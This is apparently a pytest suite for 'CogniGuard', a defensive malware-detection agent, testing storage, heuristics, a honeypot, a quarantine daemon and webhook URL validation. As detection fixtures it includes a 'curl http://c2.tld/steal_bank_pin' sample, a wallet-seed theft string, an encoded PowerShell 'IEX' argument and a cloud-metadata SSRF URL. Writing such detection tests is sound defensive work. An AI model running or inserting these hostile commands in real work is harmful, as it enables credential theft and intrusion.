"""Tests for SQLite storage concurrency, shared heuristics, scanners, and daemon."""

import os
import sys
import threading

PROJECT_ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
SRC_DIR = os.path.join(PROJECT_ROOT, "src")
if SRC_DIR not in sys.path:
    sys.path.insert(0, SRC_DIR)

from agent.alerts import format_alert_payload, validate_webhook_url  # noqa: E402
from agent.full_system_scanner import FullSystemGuardian  # noqa: E402
from agent.guardian_daemon_24x7 import CogniGuard24x7Daemon  # noqa: E402
from agent.heuristics import (  # noqa: E402
    evaluate_bytes_risk,
    evaluate_download_risk,
    evaluate_filename_risk,
    is_disguised_executable,
)
from agent.honeypot_trap import CogniGuardHoneypot  # noqa: E402
from agent.quarantine import QuarantineManager  # noqa: E402
from agent.reverse_engineer import IntentReverseEngineer  # noqa: E402
from agent.storage import CogniGuardStore  # noqa: E402
from agent.vault_guardian import CogniGuardAgent  # noqa: E402


def test_sqlite_store_concurrent_writes(tmp_path):
    store = CogniGuardStore(str(tmp_path / "concurrent.db"))
    errors = []

    def worker(tid: int):
        try:
            for idx in range(10):
                store.record_audit_event({
                    "verdict": "INTRUSION_DETECTED" if idx % 2 == 0 else "SAFE",
                    "threat_score": 0.96 if idx % 2 == 0 else 0.04,
                    "action_taken": "QUARANTINE" if idx % 2 == 0 else "ALLOW",
                    "filename": f"thread_{tid}_file_{idx}.exe",
                })
        except Exception as exc:
            errors.append(exc)

    threads = [threading.Thread(target=worker, args=(t,)) for t in range(8)]
    for th in threads:
        th.start()
    for th in threads:
        th.join()

    assert not errors
    summary = store.get_telemetry_summary("1.0.3")
    assert summary["total_events"] == 80
    assert summary["threats_blocked"] == 40
    assert summary["clean_events"] == 40


def test_heuristics_and_full_system_scanner(tmp_path):
    assert evaluate_filename_risk("offer.pdf.exe")["threat_score"] == 0.99
    assert evaluate_filename_risk("setup.exe")["verdict"] == "INTRUSION_DETECTED"
    assert evaluate_filename_risk("notes.txt")["verdict"] == "SAFE"

    fake_pdf = tmp_path / "invoice.pdf"
    fake_pdf.write_bytes(b"MZ" + b"\x00" * 128)
    real_pdf = tmp_path / "clean.pdf"
    real_pdf.write_bytes(b"%PDF-1.7\n" + b"0" * 128)
    double_ext = tmp_path / "resume.pdf.exe"
    double_ext.write_text("dummy", encoding="utf-8")

    assert is_disguised_executable(str(fake_pdf)) is True
    assert is_disguised_executable(str(real_pdf)) is False

    guardian = FullSystemGuardian()
    guardian.scan_targets = [str(tmp_path)]
    guardian.scan_full_system(max_files=50)
    flagged_names = {os.path.basename(t["file"]) for t in guardian.flagged_threats}
    assert flagged_names == {"invoice.pdf", "resume.pdf.exe"}


def test_honeypot_deploy_and_daemon_detection(tmp_path, capsys):
    trap = CogniGuardHoneypot()
    trap.desktop_dir = str(tmp_path)
    trap.honeypot_path = str(tmp_path / trap.honeypot_filename)
    trap.deploy_trap()
    assert os.path.exists(trap.honeypot_path)
    trap.trigger_honeypot_alarm("evil.exe", pid=4242)
    captured = capsys.readouterr().out
    assert "INTRUDER CAUGHT" in captured

    store = CogniGuardStore(str(tmp_path / "daemon.db"))
    quarantine_mgr = QuarantineManager(vault_dir=str(tmp_path / "vault"), store=store)
    downloads_dir = tmp_path / "Downloads"
    downloads_dir.mkdir()
    bait_file = tmp_path / "bait.txt"
    bait_file.write_text("bait", encoding="utf-8")

    daemon = CogniGuard24x7Daemon(store=store, quarantine_manager=quarantine_mgr)
    daemon.downloads_dir = str(downloads_dir)
    daemon.honeypot_file = str(bait_file)
    daemon._initialize_baseline()

    dropped = downloads_dir / "dropped_stealer.exe"
    dropped.write_text("bad", encoding="utf-8")
    daemon.check_cycle()

    assert not dropped.exists()
    q_items = store.list_quarantine_items(status="QUARANTINED")
    assert len(q_items) == 1
    assert q_items[0]["filename"] == "dropped_stealer.exe"

    logs = store.list_audit_logs()
    assert len(logs) == 1
    assert logs[0]["filename"] == "dropped_stealer.exe"
    assert logs[0]["verdict"] == "INTRUSION_DETECTED"


def test_phishing_download_and_reverse_engineer():
    phishing = evaluate_download_risk("update.pdf", "https://binance-verify.example/update.pdf")
    assert phishing["verdict"] == "INTRUSION_DETECTED"
    assert evaluate_filename_risk("loader.jar")["verdict"] == "INTRUSION_DETECTED"

    eng = IntentReverseEngineer()
    bank = eng.analyze_file_intent(b"curl http://c2.tld/steal_bank_pin", "invoice.vbs")
    assert bank["primary_target"] == "BANK_CREDENTIALS"
    assert bank["recommended_action"] == "SHRED_AND_DELETE"

    crypto = eng.analyze_file_intent(b"read metamask seed mnemonic", "helper.py")
    assert crypto["primary_target"] == "CRYPTO_WALLET"

    clean = eng.analyze_file_intent(b"print('hello world')", "readme.txt")
    assert clean["primary_target"] == "NONE"
    assert clean["recommended_action"] == "ALLOW"
    assert clean["threat_score"] == 0.05


def test_live_process_auditor(tmp_path, monkeypatch):
    agent = CogniGuardAgent()
    assert agent.evaluate_process_info(101, "code.exe", r"C:\Program Files\VSCode\Code.exe", ["code.exe"]) is None

    temp_drop = agent.evaluate_process_info(202, "update.exe", r"C:\Users\dev\AppData\Local\Temp\update.exe", [])
    assert temp_drop is not None and temp_drop["threat_score"] == 0.90

    encoded_ps = agent.evaluate_process_info(
        303,
        "powershell.exe",
        r"C:\Windows\System32\powershell.exe",
        ["powershell.exe", "-EncodedCommand", "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAKQA="],
    )
    assert encoded_ps is not None and encoded_ps["threat_score"] == 0.97

    class FakeProc:
        def __init__(self, info):
            self.info = info

    fake_procs = [
        FakeProc({"pid": 1, "name": "python.exe", "exe": r"C:\Python313\python.exe", "cmdline": ["python"]}),
        FakeProc({"pid": 999, "name": "infostealer.exe", "exe": r"C:\Users\x\AppData\Local\Temp\infostealer.exe", "cmdline": []}),
    ]
    import agent.vault_guardian as vg
    monkeypatch.setattr(vg.psutil, "process_iter", lambda attrs=None: iter(fake_procs))

    store = CogniGuardStore(str(tmp_path / "proc.db"))
    report = agent.audit_live_processes(store=store)
    assert report["processes_inspected"] == 2
    assert report["flagged_count"] == 1
    assert report["status"] == "THREATS_DETECTED"
    assert len(store.list_audit_logs()) == 1


def test_webhook_validation_and_payload_format():
    import pytest

    assert validate_webhook_url("https://discord.com/api/webhooks/123/abc") == "https://discord.com/api/webhooks/123/abc"
    assert validate_webhook_url("http://127.0.0.1:9000/hook") == "http://127.0.0.1:9000/hook"

    for unsafe in (
        "http://public.example.com/hook",
        "https://169.254.169.254/latest/meta-data",
        "https://192.168.1.10/internal",
        "ftp://files.example.com/hook",
    ):
        with pytest.raises(ValueError):
            validate_webhook_url(unsafe)

    payload = format_alert_payload({"filename": "stealer.exe", "threat_score": 0.99, "reason": "Trojan"})
    assert "stealer.exe" in payload["text"]
    assert payload["content"] == payload["text"]
    assert payload["cogniguard_event"]["threat_score"] == 0.99


def test_bytes_risk_pe_disguise_and_sha256():
    disguised = evaluate_bytes_risk(b"MZ\x90\x00FAKE_PE", "salary.pdf", "https://safe.example/salary.pdf")
    assert disguised["verdict"] == "INTRUSION_DETECTED"
    assert disguised["threat_score"] == 0.99
    assert len(disguised["sha256"]) == 64

    clean = evaluate_bytes_risk(b"%PDF-1.7\nhello", "salary.pdf", "https://safe.example/salary.pdf")
    assert clean["verdict"] == "SAFE"
    assert len(clean["sha256"]) == 64


def test_daemon_quarantines_ioc_hash_match(tmp_path):
    import hashlib

    store = CogniGuardStore(str(tmp_path / "ioc_daemon.db"))
    vault = QuarantineManager(vault_dir=str(tmp_path / "vault"), store=store)
    dl_dir = tmp_path / "Downloads"
    dl_dir.mkdir()

    payload_bytes = b"renamed-trojan-txt-payload"
    store.add_ioc(hashlib.sha256(payload_bytes).hexdigest(), "Renamed_Stealer")

    daemon = CogniGuard24x7Daemon(store=store, quarantine_manager=vault)
    daemon.downloads_dir = str(dl_dir)
    daemon.honeypot_file = str(tmp_path / "missing_bait.txt")
    daemon._initialize_baseline()

    benign_name = dl_dir / "readme_notes.txt"
    benign_name.write_bytes(payload_bytes)
    daemon.check_cycle()

    assert not benign_name.exists()
    q_items = store.list_quarantine_items(status="QUARANTINED")
    assert len(q_items) == 1
    assert "Renamed_Stealer" in q_items[0]["reason"]
